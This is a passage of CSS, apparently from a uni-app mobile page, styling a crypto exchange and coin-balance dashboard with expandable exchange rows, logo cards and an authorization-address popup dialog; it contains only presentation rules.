	background-color: rgba(255, 255, 255, 0.3);
	border-radius: 50%;
	display: flex;
	justify-content: center;
	align-items: center;
}

.add-text {
	color: white;
	font-size: 32rpx;
	font-weight: bold;
}

.transaction-subtitle {
	font-size: 24rpx;
	color: white;
	margin-bottom: 30rpx;
	opacity: 0.9;
}

.stats-section {
	display: flex;
	justify-content: space-between;
	flex-wrap: wrap;
}

.stat-item {
	width: 48%;
	margin-bottom: 20rpx;
}

.stat-label {
	font-size: 22rpx;
	color: white;
	opacity: 0.8;
	display: block;
	margin-bottom: 8rpx;
}

.stat-value {
	font-size: 24rpx;
	color: white;
	font-weight: bold;
}

/* 新增：授权地址部分样式 */
.auth-address-section {
	margin-top: 20rpx;
	padding-top: 20rpx;
	border-top: 1rpx solid rgba(255, 255, 255, 0.2);
}

.auth-label {
	font-size: 20rpx;
	color: white;
	opacity: 0.8;
	display: block;
	margin-bottom: 8rpx;
}

.auth-address {
	font-size: 22rpx;
	color: white;
	font-family: monospace;
	background-color: rgba(255, 255, 255, 0.1);
	padding: 8rpx 12rpx;
	border-radius: 8rpx;
}

.exchange-list {
	margin-bottom: 40rpx;
}

.exchange-item {
	background-color: white;
	border-radius: 16rpx;
	margin-bottom: 20rpx;
	overflow: hidden;
	box-shadow: 0 4rpx 12rpx rgba(0, 0, 0, 0.08);
}

.exchange-header {
	display: flex;
	align-items: center;
	padding: 30rpx;
	cursor: pointer;
	transition: background-color 0.3s ease;
}

.exchange-header:hover {
	background-color: #f8f9fa;
}

.exchange-item:not(:last-child) {
	border-bottom: 1px solid #f0f0f0;
}

.exchange-icon {
	width: 48rpx;
	height: 48rpx;
	margin-right: 20rpx;
}

.exchange-name {
	font-size: 28rpx;
	color: #333;
	flex: 1;
}

.exchange-value {
	font-size: 28rpx;
	color: #333;
	font-weight: bold;
	margin-right: 20rpx;
}

.exchange-arrow {
	font-size: 24rpx;
	color: #999;
	transition: transform 0.3s ease;
}

.exchange-arrow.rotated {
	transform: rotate(90deg);
}

.exchange-details {
	padding: 20rpx 30rpx;
	animation: slideDown 0.3s ease-out;
	border-top: 1px solid #f0f0f0;
	background-color: #fafafa;
}

@keyframes slideDown {
	from {
		max-height: 0;
		opacity: 0;
		padding-top: 0;
		padding-bottom: 0;
	}
	to {
		max-height: 300rpx;
		opacity: 1;
		padding-top: 20rpx;
		padding-bottom: 20rpx;
	}
}

.detail-row {
	display: flex;
	justify-content: space-between;
	margin-bottom: 15rpx;
}

.detail-label {
	font-size: 22rpx;
	color: #666;
	flex: 1;
}

.coin-row {
	display: flex;
	align-items: center;
	margin-bottom: 15rpx;
}

.coin-icon {
	width: 32rpx;
	height: 32rpx;
	margin-right: 15rpx;
	font-size: 24rpx;
	text-align: center;
}

.coin-name {
	font-size: 24rpx;
	color: #333;
	flex: 1;
}

.coin-value {
	font-size: 22rpx;
	color: #666;
	margin-right: 20rpx;
}

.coin-number {
	font-size: 22rpx;
	color: #666;
}

.exchange-logos {
	margin-bottom: 40rpx;
}

.logo-row {
	display: flex;
	justify-content: space-between;
	margin-bottom: 30rpx;
}

.logo-item {
	width: 200rpx;
	height: 80rpx;
	background-color: white;
	border-radius: 12rpx;
	display: flex;
	align-items: center;
	justify-content: center;
	box-shadow: 0 2rpx 8rpx rgba(0, 0, 0, 0.1);
}

.logo-text {
	font-size: 20rpx;
	color: #333;
	font-weight: bold;
}

.external-links {
	display: flex;
	justify-content: space-between;
	margin-bottom: 80rpx;
	padding: 0 10rpx;
}

.external-card {
	width: 200rpx;
	height: 160rpx;
	background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
	border-radius: 20rpx;
	display: flex;
	flex-direction: column;
	align-items: center;
	justify-content: center;
	box-shadow: 0 8rpx 24rpx rgba(255, 165, 0, 0.3);
	cursor: pointer;
	transition: transform 0.3s ease, box-shadow 0.3s ease;
}

.external-card:hover {
	transform: translateY(-5rpx);
	box-shadow: 0 12rpx 32rpx rgba(255, 165, 0, 0.4);
}

.card-icon {
	width: 80rpx;
	height: 80rpx;
	margin-bottom: 20rpx;
	background-color: white;
	border-radius: 50%;
	display: flex;
	align-items: center;
	justify-content: center;
	box-shadow: 0 4rpx 12rpx rgba(0, 0, 0, 0.1);
}

.card-image {
	width: 100%;
	height: 100%;
	border-radius: 50%;
}

.svg-icon {
	width: 60rpx;
	height: 60rpx;
	display: flex;
	align-items: center;
	justify-content: center;
}

.svg-icon svg {
	width: 100%;
	height: 100%;
}

.card-content {
	text-align: center;
}

.card-title {
	font-size: 24rpx;
	font-weight: bold;
	color: white;
	text-shadow: 0 2rpx 4rpx rgba(0, 0, 0, 0.2);
}

/* 添加弹窗样式 */
.auth-dialog {
	background-color: #fff;
	border-radius: 20rpx;
	width: 600rpx;
	padding: 40rpx;
}

.auth-dialog-header {
	display: flex;
	justify-content: space-between;
	align-items: center;
	margin-bottom: 30rpx;
}

.auth-dialog-title {
	font-size: 36rpx;
	font-weight: bold;
	color: #333;
}

.auth-dialog-close {
	font-size: 40rpx;
	color: #999;
	padding: 10rpx;
}

.auth-dialog-content {
	text-align: center;
}

.auth-dialog-image {
	width: 400rpx;
	height: 300rpx;
	margin-bottom: 30rpx;
}

.auth-dialog-desc {
	font-size: 28rpx;
	color: #666;
	margin-bottom: 40rpx;
	display: block;
}

.auth-dialog-btn {
	background: linear-gradient(135deg, #4A90E2 0%, #357ABD 100%);
	color: white;
	border-radius: 50rpx;
	padding: 20rpx 0;
	font-size: 32rpx;
	font-weight: bold;
	border: none;
	width: 80%;
	margin: 0 auto;
}

.auth-dialog-btn:active {
	opacity: 0.8;
}

.logo-image {
	width: 160rpx;
	height: 60rpx;
	object-fit: contain;
}

.no-data {
	padding: 20rpx;
	text-align: center;
}

.no-data-text {
	font-size: 24rpx;
	color: #999;
	opacity: 0.7;
}
</style>
